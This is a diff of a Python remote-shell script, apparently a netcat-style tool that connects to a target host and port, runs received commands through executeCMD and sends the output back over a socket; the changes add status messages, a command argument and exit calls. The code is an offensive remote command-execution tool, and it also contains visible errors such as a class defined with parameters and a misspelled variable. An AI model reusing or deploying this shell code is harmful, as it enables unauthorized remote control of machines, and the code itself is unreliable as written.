@@ -9,14 +9,16 @@ class compSystem(self, target, port):
 	self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-	def run(self):
-		self.sendCommand()
+	def run(self, command):
+		print('[+] Attempting to send the command')
+		self.sendCommand(command)
 
 	def sendCommand(self, command):
 		try:
 			self.socket.recv(4096)
 			ouput = executeCMD(command)
 			self.socket.send(output.encode())
+			print('[+] Command Successfully sent through!')
 		except:
 			print('[-] Communications Error Occured')
 			sys.exit()
@@ -39,6 +41,7 @@ def createSESH(target, port):
 		return ncSESH
 	except:
 		print('[-] Failed to create connection with host!')
+		sys.exit()
 
 def spawnShell(ncSESH):
 	command = ' '
@@ -62,6 +65,7 @@ def main():
 	print('[+] Data Processing Complete!')
 	ncSESH = createSESH(target, port)
 	spawnShell(ncSESH)
+	print('[+] Thank you for using this Script!')
 
 if __name__ == '__main__':
 	main()
